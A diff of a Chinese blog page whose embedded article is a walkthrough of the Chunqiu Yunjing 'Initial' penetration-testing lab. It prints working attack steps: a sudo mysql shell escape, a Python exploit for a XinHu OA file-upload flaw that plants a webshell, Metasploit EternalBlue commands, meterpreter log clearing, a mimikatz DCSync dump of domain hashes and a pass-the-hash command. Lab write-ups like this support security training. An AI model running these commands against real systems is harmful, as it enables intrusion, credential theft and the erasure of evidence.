@@ -57,8 +57,8 @@ peass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colo
   <meta property="og:locale" content="zh">
   <meta property="og:type" content="article">
     <meta property="article:section" content="post">
-    <meta property="article:published_time" content="2025-03-12T22:02:55+08:00">
-    <meta property="article:modified_time" content="2025-03-12T22:02:55+08:00">
+    <meta property="article:published_time" content="2025-03-12T22:03:55+08:00">
+    <meta property="article:modified_time" content="2025-03-12T22:03:55+08:00">
     <meta property="article:tag" content="Writeup">
     <meta property="article:tag" content="渗透">
     <meta property="article:tag" content="春秋云镜">
@@ -115,8 +115,8 @@ peass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colo
   "articleBody": " 参考文章\nhttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\n菜鸡第一个通关的靶场Orz\nFLAG1 fscan扫一下\n./fscan.exe -h 39.99.139.119 直接用thinkphpgui写马连蚁剑\n先用vshell上线\n读flag需要提权\npeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\n传个linpeas扫一下\n./linpeas_linux_amd64 \u003e output.txt 在历史文件中找到疑似读flag的命令\n其实这就是一个简单的sudo提权\n渗透测试：Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权-CSDN博客\nmysql 是配置了 sudo 免密使用的，可以使用 mysql 提权，通过mysql执行命令来读flag\npayload:\nsudo mysql -e '\\! /bin/sh'\rcat /root/flag/flag* flag01: flag{60b53231- 接下来搭代理\n查内网ip\n接着传一个fscan扫一下内网\nfs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15 收集到的信息\n172.22.1.2:DC域控\r172.22.1.21:Windows的机器并且存在MS17-010 漏洞\r172.22.1.18:信呼OA办公系统 FLAG2 先看信呼\n弱口令成功登入admin/admin123\n信呼协同办公系统v2.2.8存在文件上传漏洞\n[Awesome-POC/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md at master · Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md)\n1import requests 2 3session = requests.session() 4url_pre = 'http://172.22.1.18/' 5url1 = url_pre + '?a=check\u0026m=login\u0026d=\u0026ajaxbool=true\u0026rnd=533953' 6url2 = url_pre + '/index.php?a=upfile\u0026m=upload\u0026d=public\u0026maxsize=100\u0026ajaxbool=true\u0026rnd=798913' 7# url3 = url_pre + '/task.php?m=qcloudCos|runt\u0026a=run\u0026fileid=' 8data1 = { 9 'rempass': '0', 10 'jmpass': 'false', 11 'device': '1625884034525', 12 'ltype': '0', 13 'adminuser': 'YWRtaW4=', 14 'adminpass': 'YWRtaW4xMjM=', 15 'yanzm': '' 16} 17 18r = session.post(url1, data=data1) 19r = session.post(url2, files={'file': open('1.php', 'r')}) 20filepath = str(r.json()['filepath']) 21filepath = \"/\" + filepath.split('.uptemp')[0] + '.php' 22print(filepath) 23id = r.json()['id'] 24url3 = url_pre + f'/task.php?m=qcloudCos|runt\u0026a=run\u0026fileid={id}' 25r = session.get(url3) 26r = session.get(url_pre + filepath + \"?1=system('dir');\") 27print(r.text) 写马之后直接读flag就行\nflag02: 2ce3-4813-87d4- FLAG3 永恒之蓝可以用msf打\n现在kali上用proxychains4简单配个代理\nproxychains4 msfconsole\rsearch ms17-010 有四个不同的模块\n这里使用第一个模块，因为利用范围比较广\nuse exploit/windows/smb/ms17_010_eternalblue # 选择使用的模块\rset payload windows/x64/meterpreter/bind_tcp_uuid # 设置payload，可以通过show payloads查看\rset RHOSTS 172.22.1.21 # 设置靶机的ip\rexploit # 发起攻击 成功了\nmeterpreter \u003e screenshot # 捕获屏幕\rmeterpreter \u003e upload hello.txt c:// #上传文件\rmeterpreter \u003e download d://1.txt # 下载文件\rmeterpreter \u003e shell # 获取cmd\rmeterpreter \u003e clearev # 清除日志 load kiwi # 调用mimikatz模块\rkiwi_cmd \"lsadump::dcsync /domain:xiaorang.lab /all /csv\" exit # 导出域内所有用户的信息(包括哈希值) 拿到Administrator 用户的 hash，接着使用 crackmapexec 来进行哈希传递攻击，来实现 DC域控 上的任意命令执行\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \"type Users\\Administrator\\flag\\flag03.txt\" 拿到最后一个flag\n",
   "wordCount" : "909",
   "inLanguage": "zh",
-  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-03-12T22:02:55+08:00",
-  "dateModified": "2025-03-12T22:02:55+08:00",
+  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2025-03-12T22:03:55+08:00",
+  "dateModified": "2025-03-12T22:03:55+08:00",
   "author":{
     "@type": "Person",
     "name": "Xrntkk"
@@ -199,11 +199,6 @@ peass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colo
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/links/" title="友链">
-                    <span>友链</span>
-                </a>
-            </li>
-            <li>
                 <a href="http://localhost:1313/about/" title="关于">
                     <span>关于</span>
                 </a>
@@ -219,7 +214,7 @@ peass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colo
     <h1 class="post-title entry-hint-parent">
       春秋云镜-Initial-Writeup
     </h1>
-    <div class="post-meta"><span title='2025-03-12 22:02:55 +0800 CST'>2025-03-12</span>&nbsp;·&nbsp;2 分钟&nbsp;·&nbsp;Xrntkk
+    <div class="post-meta"><span title='2025-03-12 22:03:55 +0800 CST'>2025-03-12</span>&nbsp;·&nbsp;2 分钟&nbsp;·&nbsp;Xrntkk
 
 </div>
   </header> <div class="toc">
@@ -353,15 +348,15 @@ kiwi_cmd &#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&#34; exit  # 导出
       <li><a href="http://localhost:1313/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/">
+  <a class="prev" href="http://localhost:1313/post/tpctf_2025/">
     <span class="title">« 上一页</span>
     <br>
-    <span>春秋云镜-Tsclient-Writeup</span>
+    <span>TPCTF2025-Web-赛后复现Writeup</span>
   </a>
-  <a class="next" href="http://localhost:1313/post/ghctf_2025/">
+  <a class="next" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/">
     <span class="title">下一页 »</span>
     <br>
-    <span>GHCTF-2025-Web-Writeup</span>
+    <span>春秋云镜-Tsclient-Writeup</span>
   </a>
 </nav>
 
